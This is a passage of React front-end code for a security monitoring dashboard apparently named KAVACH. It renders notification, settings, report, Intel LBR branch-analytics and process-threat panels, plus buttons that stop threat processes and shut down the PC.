                  <p className="text-gray-500 text-xs">{notifications.length} alerts</p>
                </div>
              </div>
              <motion.button
                whileHover={{ scale: 1.1 }}
                whileTap={{ scale: 0.9 }}
                onClick={onClose}
                className="w-8 h-8 rounded-lg bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] flex items-center justify-center"
              >
                <X size={16} className="text-gray-400" />
              </motion.button>
            </div>
            
            <div className="p-4 max-h-[400px] overflow-y-auto">
              {notifications.length === 0 ? (
                <div className="text-center py-8">
                  <CheckCircle size={40} className="mx-auto mb-3 text-green-400 opacity-50" />
                  <p className="text-gray-400 text-sm">No Notifications</p>
                  <p className="text-gray-600 text-xs mt-1">All systems are running smoothly</p>
                </div>
              ) : (
                <div className="space-y-3">
                  {notifications.map((notif) => (
                    <motion.div
                      key={notif.id}
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className={`p-3 rounded-xl border ${
                        notif.type === 'danger' 
                          ? 'bg-[#f53d7a]/10 border-[#f53d7a]/30' 
                          : 'bg-yellow-500/10 border-yellow-500/30'
                      }`}
                    >
                      <div className="flex items-start gap-3">
                        <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${
                          notif.type === 'danger' ? 'bg-[#f53d7a]/20' : 'bg-yellow-500/20'
                        }`}>
                          <notif.icon size={16} className={notif.type === 'danger' ? 'text-[#f53d7a]' : 'text-yellow-500'} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between mb-1">
                            <p className={`text-sm font-medium ${
                              notif.type === 'danger' ? 'text-[#f53d7a]' : 'text-yellow-500'
                            }`}>{notif.title}</p>
                            <span className="text-gray-500 text-[10px]">{notif.time}</span>
                          </div>
                          <p className="text-gray-400 text-xs truncate">{notif.message}</p>
                        </div>
                      </div>
                    </motion.div>
                  ))}
                </div>
              )}
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

// Settings Modal Component
const SettingsModal = ({ isOpen, onClose, settings, onSettingsChange }) => {
  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
          onClick={onClose}
        >
          <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            onClick={(e) => e.stopPropagation()}
            className="relative w-full max-w-md bg-[#23262b] rounded-2xl shadow-[20px_20px_60px_#111215,-10px_-10px_30px_#2d3138] overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-white/5">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-[#4ceccb] to-[#a855f7] flex items-center justify-center">
                  <Settings size={16} className="text-white" />
                </div>
                <h3 className="text-white font-semibold">Settings</h3>
              </div>
              <motion.button
                whileHover={{ scale: 1.1 }}
                whileTap={{ scale: 0.9 }}
                onClick={onClose}
                className="w-8 h-8 rounded-lg bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] flex items-center justify-center"
              >
                <X size={16} className="text-gray-400" />
              </motion.button>
            </div>
            
            <div className="p-4 space-y-4">
              {/* Auto Scan Interval */}
              <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2">
                    <RefreshCw size={16} className="text-[#4ceccb]" />
                    <span className="text-white text-sm">Auto Refresh Interval</span>
                  </div>
                  <span className="text-[#4ceccb] text-sm font-mono">{settings.refreshInterval}s</span>
                </div>
                <input
                  type="range"
                  min="1"
                  max="10"
                  value={settings.refreshInterval}
                  onChange={(e) => onSettingsChange('refreshInterval', parseInt(e.target.value))}
                  className="w-full h-2 bg-[#23262b] rounded-lg appearance-none cursor-pointer accent-[#4ceccb]"
                />
                <div className="flex justify-between text-gray-600 text-[10px] mt-1">
                  <span>1s (Fast)</span>
                  <span>10s (Slow)</span>
                </div>
              </div>
              
              {/* Sound Alerts */}
              <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Bell size={16} className="text-[#a855f7]" />
                    <div>
                      <span className="text-white text-sm">Sound Alerts</span>
                      <p className="text-gray-500 text-[10px]">Play sound on threat detection</p>
                    </div>
                  </div>
                  <motion.button
                    whileTap={{ scale: 0.9 }}
                    onClick={() => onSettingsChange('soundAlerts', !settings.soundAlerts)}
                    className={`w-12 h-6 rounded-full transition-colors ${
                      settings.soundAlerts ? 'bg-[#4ceccb]' : 'bg-gray-600'
                    }`}
                  >
                    <motion.div
                      animate={{ x: settings.soundAlerts ? 24 : 2 }}
                      className="w-5 h-5 bg-white rounded-full shadow-md"
                    />
                  </motion.button>
                </div>
              </div>
              
              {/* Dark Mode (Always On) */}
              <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Eye size={16} className="text-[#f53d7a]" />
                    <div>
                      <span className="text-white text-sm">Dark Mode</span>
                      <p className="text-gray-500 text-[10px]">Optimized for security monitoring</p>
                    </div>
                  </div>
                  <motion.button
                    whileTap={{ scale: 0.9 }}
                    onClick={() => onSettingsChange('darkMode', !settings.darkMode)}
                    className={`w-12 h-6 rounded-full transition-colors ${
                      settings.darkMode ? 'bg-[#4ceccb]' : 'bg-gray-600'
                    }`}
                  >
                    <motion.div
                      animate={{ x: settings.darkMode ? 24 : 2 }}
                      className="w-5 h-5 bg-white rounded-full shadow-md"
                    />
                  </motion.button>
                </div>
              </div>
              
              {/* Auto Kill Threats */}
              <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <ShieldAlert size={16} className="text-red-500" />
                    <div>
                      <span className="text-white text-sm">Auto-Kill Threats</span>
                      <p className="text-gray-500 text-[10px]">Automatically terminate detected threats</p>
                    </div>
                  </div>
                  <motion.button
                    whileTap={{ scale: 0.9 }}
                    onClick={() => onSettingsChange('autoKill', !settings.autoKill)}
                    className={`w-12 h-6 rounded-full transition-colors ${
                      settings.autoKill ? 'bg-red-500' : 'bg-gray-600'
                    }`}
                  >
                    <motion.div
                      animate={{ x: settings.autoKill ? 24 : 2 }}
                      className="w-5 h-5 bg-white rounded-full shadow-md"
                    />
                  </motion.button>
                </div>
              </div>
            </div>
            
            <div className="p-4 border-t border-white/5">
              <p className="text-gray-500 text-xs text-center">
                Settings are saved automatically
              </p>
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

// Reports Section Component
const ReportsSection = ({ 
  cpuUsage, 
  memoryUsage, 
  integrityScore, 
  integrityData,
  securityMetrics, 
  lbrData, 
  processes,
  simulatedThreats 
}) => {
  const generateReport = () => {
    const timestamp = new Date().toLocaleString();
    return {
      timestamp,
      summary: {
        status: integrityScore >= 70 ? 'SECURE' : integrityScore >= 50 ? 'WARNING' : 'CRITICAL',
        overallScore: integrityScore,
        threatCount: securityMetrics.threat_processes || 0,
        processCount: processes.length,
      },
      cpu: {
        usage: cpuUsage,
        status: cpuUsage < 80 ? 'Normal' : 'High',
      },
      memory: {
        used: memoryUsage.used_gb,
        total: memoryUsage.total_gb,
        percent: memoryUsage.percent,
        status: memoryUsage.percent < 80 ? 'Normal' : 'High',
      },
      lbr: {
        supported: lbrData?.supported || false,
        cpuVendor: lbrData?.cpu_vendor || 'Unknown',
        totalBranches: lbrData?.total_branches || 0,
        suspiciousBranches: lbrData?.suspicious_branches || 0,
      },
      integrity: {
        score: integrityScore,
        factors: integrityData?.factors || {},
        deductions: integrityData?.deductions || [],
      },
      threats: simulatedThreats || [],
    };
  };
  
  const report = generateReport();

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className="bg-[#23262b] rounded-2xl p-6 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138]"
    >
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-[#4ceccb] to-[#a855f7] flex items-center justify-center">
            <PieChart size={20} className="text-white" />
          </div>
          <div>
            <h3 className="text-white font-semibold">Security Report</h3>
            <p className="text-gray-500 text-xs">Generated: {report.timestamp}</p>
          </div>
        </div>
        <span className={`px-3 py-1 rounded-full text-xs font-bold ${
          report.summary.status === 'SECURE' 
            ? 'bg-green-500/20 text-green-400' 
            : report.summary.status === 'WARNING'
            ? 'bg-yellow-500/20 text-yellow-500'
            : 'bg-red-500/20 text-red-400'
        }`}>
          {report.summary.status}
        </span>
      </div>
      
      <div className="grid grid-cols-4 gap-3 mb-4">
        {/* CPU Summary */}
        <div className="bg-[#1a1c20] rounded-xl p-3 shadow-[inset_2px_2px_4px_#111215,inset_-2px_-2px_4px_#2d3138]">
          <div className="flex items-center gap-2 mb-2">
            <Cpu size={14} className="text-[#4ceccb]" />
            <span className="text-gray-400 text-xs">CPU</span>
          </div>
          <p className="text-white text-lg font-bold">{report.cpu.usage}%</p>
          <p className={`text-xs ${report.cpu.status === 'Normal' ? 'text-green-400' : 'text-yellow-500'}`}>
            {report.cpu.status}
          </p>
        </div>
        
        {/* Memory Summary */}
        <div className="bg-[#1a1c20] rounded-xl p-3 shadow-[inset_2px_2px_4px_#111215,inset_-2px_-2px_4px_#2d3138]">
          <div className="flex items-center gap-2 mb-2">
            <MemoryStick size={14} className="text-[#a855f7]" />
            <span className="text-gray-400 text-xs">Memory</span>
          </div>
          <p className="text-white text-lg font-bold">{report.memory.percent}%</p>
          <p className="text-gray-500 text-[10px]">{report.memory.used}/{report.memory.total} GB</p>
        </div>
        
        {/* LBR Summary */}
        <div className="bg-[#1a1c20] rounded-xl p-3 shadow-[inset_2px_2px_4px_#111215,inset_-2px_-2px_4px_#2d3138]">
          <div className="flex items-center gap-2 mb-2">
            <GitBranch size={14} className="text-[#4ceccb]" />
            <span className="text-gray-400 text-xs">LBR</span>
          </div>
          <p className={`text-lg font-bold ${report.lbr.supported ? 'text-green-400' : 'text-red-400'}`}>
            {report.lbr.supported ? 'Active' : 'N/A'}
          </p>
          <p className="text-gray-500 text-[10px]">{report.lbr.cpuVendor}</p>
        </div>
        
        {/* Threats Summary */}
        <div className="bg-[#1a1c20] rounded-xl p-3 shadow-[inset_2px_2px_4px_#111215,inset_-2px_-2px_4px_#2d3138]">
          <div className="flex items-center gap-2 mb-2">
            <Skull size={14} className="text-[#f53d7a]" />
            <span className="text-gray-400 text-xs">Threats</span>
          </div>
          <p className={`text-lg font-bold ${report.summary.threatCount > 0 ? 'text-[#f53d7a]' : 'text-green-400'}`}>
            {report.summary.threatCount}
          </p>
          <p className="text-gray-500 text-[10px]">{report.summary.processCount} processes</p>
        </div>
      </div>
      
      {/* Detailed Analysis */}
      <div className="grid grid-cols-2 gap-3">
        {/* Integrity Factors */}
        <div className="bg-[#1a1c20] rounded-xl p-3 shadow-[inset_2px_2px_4px_#111215,inset_-2px_-2px_4px_#2d3138]">
          <h4 className="text-gray-400 text-xs mb-2 flex items-center gap-2">
            <Shield size={12} />
            Integrity Factors
          </h4>
          <div className="space-y-1.5">
            <div className="flex items-center justify-between text-xs">
              <span className="text-gray-500">Kernel Protection</span>
              <span className={report.integrity.factors.kernel_protection !== false ? 'text-green-400' : 'text-red-400'}>
                {report.integrity.factors.kernel_protection !== false ? '✓ Enabled' : '✗ Disabled'}
              </span>
            </div>
            <div className="flex items-center justify-between text-xs">
              <span className="text-gray-500">Memory Security</span>
              <span className={report.integrity.factors.memory_secured !== false ? 'text-green-400' : 'text-yellow-500'}>
                {report.integrity.factors.memory_secured !== false ? '✓ Secured' : '⚠ High Usage'}
              </span>
            </div>
            <div className="flex items-center justify-between text-xs">
              <span className="text-gray-500">LBR Monitoring</span>
              <span className={report.lbr.supported ? 'text-green-400' : 'text-gray-500'}>
                {report.lbr.supported ? '✓ Active' : '— Unavailable'}
              </span>
            </div>
            <div className="flex items-center justify-between text-xs">
              <span className="text-gray-500">Network Status</span>
              <span className={report.integrity.factors.network_safe !== false ? 'text-green-400' : 'text-red-400'}>
                {report.integrity.factors.network_safe !== false ? '✓ Safe' : '✗ Suspicious'}
              </span>
            </div>
          </div>
        </div>
        
        {/* Active Threats */}
        <div className="bg-[#1a1c20] rounded-xl p-3 shadow-[inset_2px_2px_4px_#111215,inset_-2px_-2px_4px_#2d3138]">
          <h4 className="text-gray-400 text-xs mb-2 flex items-center gap-2">
            <AlertTriangle size={12} />
            Active Threats
          </h4>
          {report.threats.length === 0 ? (
            <div className="text-center py-3">
              <CheckCircle size={20} className="mx-auto mb-1 text-green-400 opacity-50" />
              <p className="text-green-400 text-xs">No Active Threats</p>
            </div>
          ) : (
            <div className="space-y-1.5 max-h-[80px] overflow-y-auto">
              {report.threats.map((threat, i) => (
                <div key={i} className="flex items-center justify-between text-xs bg-[#f53d7a]/10 rounded-lg p-1.5">
                  <span className="text-[#f53d7a] truncate">{threat.name}</span>
                  <span className="text-gray-500">PID: {threat.pid}</span>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </motion.div>
  );
};

// LBR Analytics Panel Component
const LBRAnalyticsPanel = ({ isOpen, onClose, lbrData }) => {
  const isSupported = lbrData?.supported;
  
  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center p-4"
          onClick={onClose}
        >
          <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            onClick={(e) => e.stopPropagation()}
            className="relative w-full max-w-3xl bg-[#23262b] rounded-2xl shadow-[20px_20px_60px_#111215,-10px_-10px_30px_#2d3138] overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-white/5">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-[#4ceccb] to-[#a855f7] flex items-center justify-center">
                  <BarChart3 size={16} className="text-white" />
                </div>
                <div>
                  <h3 className="text-white font-semibold">LBR Analytics</h3>
                  <p className="text-gray-500 text-xs">
                    {isSupported ? 'Real-time branch monitoring data' : 'Hardware LBR unavailable'}
                  </p>
                </div>
              </div>
              <motion.button
                whileHover={{ scale: 1.1 }}
                whileTap={{ scale: 0.9 }}
                onClick={onClose}
                className="w-8 h-8 rounded-lg bg-[#1a1c20] shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] flex items-center justify-center"
              >
                <X size={16} className="text-gray-400" />
              </motion.button>
            </div>
            
            <div className="p-6">
              {!isSupported ? (
                <div className="text-center py-12">
                  <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-yellow-500/10 flex items-center justify-center">
                    <AlertTriangle size={40} className="text-yellow-500" />
                  </div>
                  <h4 className="text-white text-lg font-semibold mb-2">No LBR Data Available</h4>
                  <p className="text-gray-400 text-sm mb-4">
                    Your system is using a non-Intel chip ({lbrData?.cpu_vendor || 'Unknown'})
                  </p>
                  <div className="bg-[#1a1c20] rounded-xl p-4 max-w-md mx-auto shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                    <p className="text-gray-500 text-xs leading-relaxed">
                      Last Branch Record (LBR) is an Intel-specific hardware feature that records the most recent branches taken by the CPU. 
                      This feature is not available on ARM-based processors like Apple Silicon (M1/M2/M3) or AMD processors.
                    </p>
                  </div>
                </div>
              ) : (
                <>
                  {/* Stats Overview */}
                  <div className="grid grid-cols-4 gap-4 mb-6">
                    <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                      <p className="text-gray-500 text-xs mb-1">Total Branches</p>
                      <p className="text-[#4ceccb] text-2xl font-bold">{(lbrData?.total_branches || 0).toLocaleString()}</p>
                    </div>
                    <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                      <p className="text-gray-500 text-xs mb-1">Suspicious</p>
                      <p className={`text-2xl font-bold ${(lbrData?.suspicious_branches || 0) > 0 ? 'text-[#f53d7a]' : 'text-green-400'}`}>
                        {lbrData?.suspicious_branches || 0}
                      </p>
                    </div>
                    <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                      <p className="text-gray-500 text-xs mb-1">Processes</p>
                      <p className="text-[#a855f7] text-2xl font-bold">{lbrData?.entries?.length || 0}</p>
                    </div>
                    <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                      <p className="text-gray-500 text-xs mb-1">CPU Type</p>
                      <p className="text-white text-sm font-medium truncate">{lbrData?.cpu_type || 'Unknown'}</p>
                    </div>
                  </div>
                  
                  {/* Branch Entries Table */}
                  <div className="bg-[#1a1c20] rounded-xl p-4 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
                    <h4 className="text-gray-400 text-xs mb-3">Branch Records</h4>
                    {(lbrData?.entries?.length || 0) === 0 ? (
                      <div className="text-center py-8">
                        <Activity size={30} className="mx-auto mb-2 text-gray-500 opacity-50" />
                        <p className="text-gray-500 text-sm">No branch records yet</p>
                        <p className="text-gray-600 text-xs">Waiting for branch activity...</p>
                      </div>
                    ) : (
                      <div className="overflow-x-auto max-h-[200px] overflow-y-auto">
                        <table className="w-full text-xs">
                          <thead className="text-gray-500 border-b border-white/5">
                            <tr>
                              <th className="text-left py-2 px-2">Process</th>
                              <th className="text-left py-2 px-2">PID</th>
                              <th className="text-left py-2 px-2">From</th>
                              <th className="text-left py-2 px-2">To</th>
                              <th className="text-left py-2 px-2">Branches</th>
                              <th className="text-left py-2 px-2">Status</th>
                            </tr>
                          </thead>
                          <tbody>
                            {(lbrData?.entries || []).map((entry, idx) => (
                              <tr key={idx} className={`border-b border-white/5 ${entry.status === 'SUSPICIOUS' ? 'bg-[#f53d7a]/5' : ''}`}>
                                <td className="py-2 px-2 text-white truncate max-w-[100px]">{entry.process}</td>
                                <td className="py-2 px-2 text-gray-400">{entry.pid}</td>
                                <td className="py-2 px-2 text-[#4ceccb] font-mono">{entry.from_addr?.slice(-12)}</td>
                                <td className="py-2 px-2 text-[#a855f7] font-mono">{entry.to_addr?.slice(-12)}</td>
                                <td className="py-2 px-2 text-gray-400">{entry.branches}</td>
                                <td className="py-2 px-2">
                                  <span className={`px-2 py-0.5 rounded text-[10px] ${
                                    entry.status === 'SUSPICIOUS' 
                                      ? 'bg-[#f53d7a]/20 text-[#f53d7a]' 
                                      : 'bg-green-500/20 text-green-400'
                                  }`}>
                                    {entry.status}
                                  </span>
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    )}
                  </div>
                </>
              )}
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

// Console/Debug Log Component
const DebugConsole = ({ logs }) => (
  <motion.div
    initial={{ opacity: 0, y: 20 }}
    animate={{ opacity: 1, y: 0 }}
    className="bg-[#1a1c20] rounded-xl p-3 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]"
  >
    <div className="flex items-center justify-between mb-2">
      <div className="flex items-center gap-2">
        <Terminal size={14} className="text-[#4ceccb]" />
        <span className="text-gray-400 text-xs font-mono">KAVACH Console</span>
      </div>
      <div className="flex gap-1">
        <div className="w-2 h-2 rounded-full bg-[#f53d7a]" />
        <div className="w-2 h-2 rounded-full bg-yellow-500" />
        <div className="w-2 h-2 rounded-full bg-green-500" />
      </div>
    </div>
    <div className="h-20 overflow-y-auto font-mono text-xs space-y-1">
      {logs.map((log, index) => (
        <motion.div
          key={index}
          initial={{ opacity: 0, x: -10 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: index * 0.05 }}
          className={`flex items-start gap-2 ${
            log.type === 'error' ? 'text-[#f53d7a]' : 
            log.type === 'warning' ? 'text-yellow-500' : 
            log.type === 'success' ? 'text-green-400' : 'text-gray-400'
          }`}
        >
          <span className="text-gray-600">[{log.time}]</span>
          <span>{log.message}</span>
        </motion.div>
      ))}
    </div>
  </motion.div>
);

// Right Panel - LBR Jump Addresses Chart - NOW USES REAL DATA
const JumpAddressChart = ({ lbrData }) => {
  const isSupported = lbrData?.supported;
  const entries = lbrData?.entries || [];
  
  // Generate address frequency data from LBR entries
  const getAddressData = () => {
    if (!isSupported || entries.length === 0) {
      return [];
    }
    
    // Group by to_addr and count frequencies
    const addrMap = {};
    entries.forEach(entry => {
      const addr = entry.to_addr?.slice(-8) || 'Unknown';
      if (!addrMap[addr]) {
        addrMap[addr] = { count: 0, suspicious: false };
      }
      addrMap[addr].count++;
      if (entry.status === 'SUSPICIOUS') {
        addrMap[addr].suspicious = true;
      }
    });
    
    // Convert to array and normalize
    const maxCount = Math.max(...Object.values(addrMap).map(v => v.count), 1);
    return Object.entries(addrMap).slice(0, 5).map(([addr, data]) => ({
      addr: `0x...${addr}`,
      jumps: Math.round((data.count / maxCount) * 100),
      safe: !data.suspicious,
      count: data.count,
    }));
  };
  
  const addresses = getAddressData();

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: 0.5 }}
      className="mt-4"
    >
      <h3 className="text-white font-semibold mb-3 text-sm flex items-center gap-2">
        Jump Address Frequency
        {isSupported && <span className="text-[10px] text-green-400 bg-green-500/20 px-2 py-0.5 rounded-full">Live</span>}
      </h3>
      <div className="bg-[#1a1c20] rounded-xl p-3 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]">
        {!isSupported ? (
          <div className="h-28 flex flex-col items-center justify-center text-center">
            <AlertTriangle size={20} className="text-yellow-500 mb-2" />
            <p className="text-gray-500 text-xs">No LBR Connection</p>
            <p className="text-gray-600 text-[10px] mt-1">Non-Intel chip detected</p>
          </div>
        ) : addresses.length === 0 ? (
          <div className="h-28 flex flex-col items-center justify-center text-center">
            <Activity size={20} className="text-gray-500 mb-2" />
            <p className="text-gray-500 text-xs">No jump data available</p>
            <p className="text-gray-600 text-[10px] mt-1">Waiting for branch activity...</p>
          </div>
        ) : (
          <div className="flex items-end justify-around h-28 gap-2">
            {addresses.map((item, index) => (
              <div key={item.addr} className="flex flex-col items-center gap-1 flex-1">
                <span className="text-gray-400 text-[8px]">{item.count}</span>
                <motion.div
                  initial={{ height: 0 }}
                  animate={{ height: `${item.jumps}%` }}
                  transition={{ delay: 0.6 + index * 0.1, duration: 0.5, ease: 'easeOut' }}
                  className={`w-full max-w-[20px] rounded-t-md ${
                    item.safe
                      ? 'bg-gradient-to-t from-[#4ceccb]/50 to-[#4ceccb]'
                      : 'bg-gradient-to-t from-[#f53d7a]/50 to-[#f53d7a]'
                  }`}
                  style={{
                    filter: !item.safe ? 'drop-shadow(0 0 8px #f53d7a)' : 'none',
                  }}
                />
                <span className="text-gray-600 text-[8px] font-mono truncate w-full text-center">{item.addr}</span>
              </div>
            ))}
          </div>
        )}
      </div>
    </motion.div>
  );
};

// Security Stats Component for Right Panel - NOW USES REAL DATA
const SecurityStats = ({ metrics, lbrData }) => {
  // Format uptime
  const formatUptime = (seconds) => {
    if (!seconds) return '0d 0h';
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    return `${days}d ${hours}h`;
  };

  // Format large numbers
  const formatNumber = (num) => {
    if (num >= 1000000) return `${(num / 1000000).toFixed(1)}M`;
    if (num >= 1000) return `${(num / 1000).toFixed(1)}K`;
    return num?.toString() || '0';
  };

  const stats = [
    { 
      label: 'Branches Monitored', 
      value: lbrData?.supported ? formatNumber(metrics?.branches_monitored || 0) : 'N/A',
      change: lbrData?.supported ? 'Real-time' : 'No LBR'
    },
    { 
      label: 'Threats Detected', 
      value: (metrics?.threat_processes || 0).toString(),
      change: metrics?.threat_processes > 0 ? '⚠️ Active' : '✓ Clear'
    },
    { 
      label: 'Processes Scanned', 
      value: (metrics?.total_processes || 0).toString(),
      change: `${metrics?.safe_processes || 0} safe`
    },
    { 
      label: 'System Uptime', 
      value: formatUptime(metrics?.uptime_seconds),
      change: `${(metrics?.uptime_percent || 0).toFixed(1)}%`
    },
  ];

  return (
    <div className="space-y-3">
      <h3 className="text-white font-semibold text-sm">Security Metrics</h3>
      <div className="space-y-1">
        {stats.map((stat, index) => (
          <motion.div
            key={stat.label}
            initial={{ x: 20, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
            transition={{ delay: 0.3 + index * 0.1 }}
            className="flex items-center py-2 border-l-2 border-white/5 pl-3 hover:border-[#4ceccb] transition-colors"
          >
            <div className="flex-1">
              <p className="text-gray-500 text-[10px] uppercase tracking-wider">{stat.label}</p>
              <p className={`font-bold text-sm ${
                stat.label === 'Threats Detected' && parseInt(stat.value) > 0 
                  ? 'text-[#f53d7a]' 
                  : 'text-white'
              }`}>{stat.value}</p>
            </div>
            <span className={`text-[10px] font-medium ${
              stat.change.includes('⚠️') ? 'text-[#f53d7a]' : 'text-[#4ceccb]'
            }`}>{stat.change}</span>
          </motion.div>
        ))}
      </div>
    </div>
  );
};

// Right Panel Component - NOW USES REAL DATA
const RightPanel = ({ onKillAllThreats, onShutdown, searchQuery, setSearchQuery, onSearch, metrics, lbrData }) => (
  <motion.div
    initial={{ x: 50, opacity: 0 }}
    animate={{ x: 0, opacity: 1 }}
    transition={{ duration: 0.5 }}
    className="w-[300px] h-full py-6 px-5 border-l border-white/5"
    style={{
      background: 'rgba(35, 38, 43, 0.5)',
      backdropFilter: 'blur(12px)',
    }}
  >
    <SecurityStats metrics={metrics} lbrData={lbrData} />
    
    {/* Search Bar */}
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ delay: 0.5 }}
      className="mt-4"
    >
      <div className="relative">
        <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" />
        <input
          type="text"
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          onKeyDown={(e) => e.key === 'Enter' && onSearch()}
          placeholder="Search processes..."
          className="w-full bg-[#1a1c20] rounded-xl py-2.5 pl-9 pr-4 text-sm text-white placeholder-gray-500 shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138] focus:outline-none focus:ring-1 focus:ring-[#4ceccb]/50"
        />
      </div>
    </motion.div>
    
    <JumpAddressChart lbrData={lbrData} />
    
    {/* Quick Actions */}
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ delay: 0.8 }}
      className="mt-4"
    >
      <h3 className="text-white font-semibold mb-3 text-sm">Quick Actions</h3>
      <div className="space-y-2">
        <motion.button
          whileHover={{ scale: 1.02, y: -2 }}
          whileTap={{ scale: 0.98 }}
          onClick={onKillAllThreats}
          className="w-full bg-[#23262b] rounded-xl p-4 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138] flex items-center gap-3 hover:bg-[#f53d7a]/10 hover:border-[#f53d7a]/30 border border-transparent transition-all group"
        >
          <div className="w-10 h-10 rounded-xl bg-[#f53d7a]/20 flex items-center justify-center">
            <Skull size={20} className="text-[#f53d7a]" />
          </div>
          <div className="text-left">
            <p className="text-white text-sm font-medium group-hover:text-[#f53d7a] transition-colors">Stop All Threats</p>
            <p className="text-gray-500 text-xs">Terminate all threat processes</p>
          </div>
        </motion.button>
        
        <motion.button
          whileHover={{ scale: 1.02, y: -2 }}
          whileTap={{ scale: 0.98 }}
          onClick={onShutdown}
          className="w-full bg-[#23262b] rounded-xl p-4 shadow-[10px_10px_20px_#111215,-5px_-5px_15px_#2d3138] flex items-center gap-3 hover:bg-red-500/10 hover:border-red-500/30 border border-transparent transition-all group"
        >
          <div className="w-10 h-10 rounded-xl bg-red-500/20 flex items-center justify-center">
            <XCircle size={20} className="text-red-500" />
          </div>
          <div className="text-left">
            <p className="text-white text-sm font-medium group-hover:text-red-500 transition-colors">Shutdown PC</p>
            <p className="text-gray-500 text-xs">Safely shutdown the system</p>
          </div>
        </motion.button>
      </div>
    </motion.div>

    {/* Hardware Info - NOW SHOWS REAL DATA */}
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ delay: 1 }}
      className="mt-4 p-3 bg-[#1a1c20] rounded-xl shadow-[inset_4px_4px_8px_#111215,inset_-4px_-4px_8px_#2d3138]"
    >
      <h4 className="text-gray-400 text-xs mb-2">Hardware Engine</h4>
      <div className="space-y-1.5 text-[10px] font-mono">
        <div className="flex justify-between">
          <span className="text-gray-500">LBR Support:</span>
          <span className={lbrData?.supported ? 'text-green-400' : 'text-red-400'}>
            {lbrData?.supported ? 'Active' : 'Not Available'}
          </span>
        </div>
        <div className="flex justify-between">
          <span className="text-gray-500">CPU Vendor:</span>
          <span className="text-[#4ceccb]">{lbrData?.cpu_vendor || 'Unknown'}</span>
        </div>
        <div className="flex justify-between">
          <span className="text-gray-500">VM Detection:</span>
